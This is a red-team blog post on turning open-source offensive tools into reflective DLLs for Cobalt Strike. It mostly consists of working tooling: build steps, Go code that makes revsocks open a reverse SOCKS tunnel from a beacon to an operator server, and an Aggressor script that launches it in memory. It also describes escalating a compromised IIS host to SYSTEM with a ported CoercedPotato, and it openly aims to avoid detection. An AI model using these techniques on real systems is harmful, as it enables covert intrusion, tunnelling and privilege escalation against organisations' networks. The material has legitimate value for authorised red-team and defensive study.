---
title: Create a Reflective DLL for Cobalt Strike
date: 2023-10-11
categories: [ "Malware Development" ]
tags: [ "research", "command and control", "windows", "reflective dll", "tooling" ]     # TAG names should always be lowercase
---

## Context

This blog post aims to solve a problem I faced when using open source tooling with Cobalt Strike.

During my security assessments I often rely on tooling developped in Python, C#, Go or C/C++. Opensource tools are very often built to produce a PE file that doesn’t fit well on red team engagement as we prefer to avoid uploading and executing file on disk. For Python tools, we need a SOCKS proxy but C2 SOCKS are quite slow as the SOCKS traffic is over the egress C2 traffic of the beacon.

In this blogpost I’m going to show how I ported 2 tools so that they produce a Reflective DLL (RDLL) which could be used in CobaltStrike and executing everything from memory.

## Golang - revsocks

To overcome the SOCKS latency issue, I’m using a modified version of [revsocks](https://github.com/kost/revsocks). Revsocks is splited in 2 parts: the server and the client. The server listens for incoming connections and starts a SOCKS server when a valid connection is established.

Back to 2019, [@EthicalChaos](https://twitter.com/_EthicalChaos_) made a blogpost about how we can used Golang tooling with Cobalt Strike ([Weaponizing your favorite Go program for Cobalt Strike](https://ethicalchaos.dev/2020/01/26/weaponizing-your-favorite-go-program-for-cobalt-strike/)) and released [goreflect](https://github.com/CCob/goreflect), a template to generate a RDLL from a Go project.

I had some issue using this template from a Linux machine so I will explain what I did to make it work.


Before anything, we will compile a Golang program so the PE will be quite large. So we need to increase the task size limit in the malleable profile in order to transfer the RDLL to the beacon.

```
set tasks_max_size "5048576";
```

Now clone the template Github repository

```
git clone https://github.com/CCob/goreflect
```

Then modify `CMakeLists.txt` to add the following flags

```
project (goreflect)

#Dependency to add simple Go support to CMake
include(${CMAKE_SOURCE_DIR}/cmake/GolangSimple.cmake)

# flags for cross compilation
set(CMAKE_C_COMPILER x86_64-w64-mingw32-gcc)
set(GOOS windows)
set(GARCH amd64)
set (DIST_DIR ${CMAKE_SOURCE_DIR}/dist)
```

I removed the following lines

```
#Your favorite go tool definition
GO_GET(gobuster github.com/OJ/gobuster)
```

I added this at the end of the file to create the final RDLL file

```
add_custom_command(
        TARGET goreflect POST_BUILD
        COMMAND ${CMAKE_COMMAND} -E copy
                ${CMAKE_BINARY_DIR}/libgoreflect.so
                ${DIST_DIR}/revsocks.dll)
```

And I renamed the references of `gobuster` to match `revsocks`.

As revsocks is not developped as a library, we cannot just parse the arguments of the RDLL and pass them to a revsocks API.

```go
//export start
func start(arg string) {
    args, err := gsq.Split(arg)
    args = append([]string{"goreflect"}, args...)
    os.Args = args
    
    // parse arg
    // ...

    // doesn't exist
    revsocks.startclient(args.host, args.port, ....)
```

we need to copy the functions defined in `rclient.go` (from revsocks) to `goreflect.go` and call them in the main of the program

```go

func connectviaproxy(proxyaddr string, connectaddr string) net.Conn {
    // ...
}

func connectForSocks(tlsenable bool, verify bool, address string, proxy string) error {
    // ....
}


//export start
func start(arg string) {

	//parse our monolithinc argument string into individual args
	args, err := gsq.Split(arg)

	//our first argument is usally the program name, to just fake it
	args = append([]string{"goreflect"}, args...)

	if err == nil {
		//replace os.Args ready for calling our go program
		os.Args = args

		connect := flag.String("connect", "", "connect address:port")
		proxy := flag.String("proxy", "", "proxy address:port")
		optproxytimeout := flag.String("proxytimeout", "", "proxy response timeout (ms)")
		proxyauthstring := flag.String("proxyauth", "", "proxy auth Domain/user:Password ")
		optuseragent := flag.String("useragent", "", "User-Agent")
		optpassword := flag.String("pass", "", "Connect password")
		recn := flag.Int("recn", 3, "reconnection limit")
		rect := flag.Int("rect", 30, "reconnection delay")

		flag.Usage = func() {

			fmt.Println("revsocks - reverse socks5 server/client")
			fmt.Println("")
			flag.PrintDefaults()
			fmt.Println("")
			fmt.Println("Usage:")
			fmt.Println("1) Start on the client: revsocks -listen :8080 -socks 127.0.0.1:1080 -pass test")
			fmt.Println("3) Connect to 127.0.0.1:1080 on the client with any socks5 client.")
		}

        // parse os.Args
		flag.Parse()

		//run our go program

		if *connect == "" {
			flag.Usage()
			os.Exit(0)
		}

        // call to connectForSocks or something else...

```

When `goreflect.go` is ready, you can build the project and it should produce `dist/revsocks.dll`.

```
cd cmake
cmake ..
make
```

Now we can create a Cobalt Strike agressor script to execute our RDLL:

```perl
beacon_command_register("Revsocks", "Socks5 with NTLM proxy support",
   "Connect Usage: Revsocks -connect 20.20.20.20:443 -pass Password1\n");


alias Revsocks {
   local('$bid', '$args');
   $bid = $1;
   $args = substr($0, 9);

   if ($args eq "") {
      berror($bid, "Please specify an argument string");
		return;
   }
   blog($bid, "Spawn Revsocks as a Reflective DLL with args\n$args\n");
   bdllspawn($bid, script_resource("dist/revsocks.dll"), $args, "Revsocks", 5000, false);
}
```

Once the CNA is ready, load it in Cobalt Strike and call the Revsocks function in your beacon

![](/assets/posts/2023-09-11-create-reflective-dll-cobalt-strike/rdll-revsocks2.png)

And you should get a callback on your revsocks server

![](/assets/posts/2023-09-11-create-reflective-dll-cobalt-strike/revsocks-server.png)


## CoercedPotato for privilege escalation

During a recent engagement my teammates and I gained RCE on a Windows IIS server (I will make dedicated blogposts on this) and we ended up to get a beacon on the server as a NT Local Service account.

We sucessfuly used [GodPotato](https://github.com/BeichenDream/GodPotato) through `execute-assembly` to get a SYSTEM beacon. However, `execute-assembly` can be easily spotted as it loads CLR.dll in the sacrificial process spawned by Cobalt Strike.

I wanted to have another solution without using `execute-assembly` and so I came up to using Reflective DLL loading.

Two months ago, [CoercedPotato](https://github.com/Prepouce/CoercedPotato) was released with the benefit to be a C++ tool so it can easily be ported to a RDLL.

I cloned the repo and integrate [Stephen Fewer RDLL library](https://github.com/stephenfewer/ReflectiveDLLInjection) to it.

There is not so much to talk about except I had to split the project in 2 parts

- the RPC server / named pipe
- the coercer client

I did not succeed to spawn the RPC server with `CreateThread` via a RDLL so I decided to first load the RDLL to spawn it, then to load it another time to coerce the SYSTEM authentication.

I removed some parts of the code to only keep the MS-RPRN coerce.

You can find the code on my Github [CoercedPotatoRDLL](https://github.com/sokaRepo/CoercedPotatoRDLL).

![](/assets/posts/2023-09-11-create-reflective-dll-cobalt-strike/coercedpotato.png)